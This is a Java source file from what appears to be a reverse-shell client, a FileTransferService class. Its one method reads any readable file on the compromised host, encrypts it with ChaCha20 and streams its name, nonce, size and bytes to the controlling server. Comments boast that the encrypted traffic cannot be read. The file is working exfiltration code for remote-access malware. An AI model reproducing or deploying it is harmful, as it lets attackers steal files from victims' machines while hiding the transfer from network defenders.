package obs1d1anc1ph3r.reverseshell.client.utils;

import java.io.File;
import java.nio.file.Files;
import obs1d1anc1ph3r.reverseshell.client.responsehandling.ResponseSender;
import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;

public class FileTransferService {

	//Ooo, it's encrypted now, can't decrypt this losersssss
	public void sendEncryptedFile(File file, ResponseSender responseSender, StreamHandler streamHandler) throws Exception {
		if (!file.exists() || !file.isFile()) {
			responseSender.sendEncryptedResponse("Error: File not found: " + file.getAbsolutePath());
			return;
		}

		if (!file.canRead()) { //Then it's just like me (I am illiterate)
			responseSender.sendEncryptedResponse("Error: File is not readable: " + file.getAbsolutePath());
			return;
		}

		byte[] fileBytes = Files.readAllBytes(file.toPath());
		byte[] nonce = ChaCha20.generateNonce(); //Stupid hat
		byte[] encryptedFileBytes = ChaCha20.encrypt(streamHandler.getEncryptionKey(), nonce, fileBytes);

		responseSender.sendEncryptedResponse("file download"); //Server needs to know what's up

		streamHandler.getDataOut().writeUTF(file.getName()); //Server needs to know the file name

		streamHandler.getDataOut().writeInt(nonce.length); //Stupid hat.length -- Not a hat
		streamHandler.getDataOut().write(nonce); //Sever needs to know the stupid hat -- Really isn't a hat, dude

		streamHandler.getDataOut().writeInt(encryptedFileBytes.length); //Server needs to know the file size
		streamHandler.getDataOut().write(encryptedFileBytes); //Server needs the bytes
		streamHandler.getDataOut().flush(); //Again, gross if you don't
	}
}
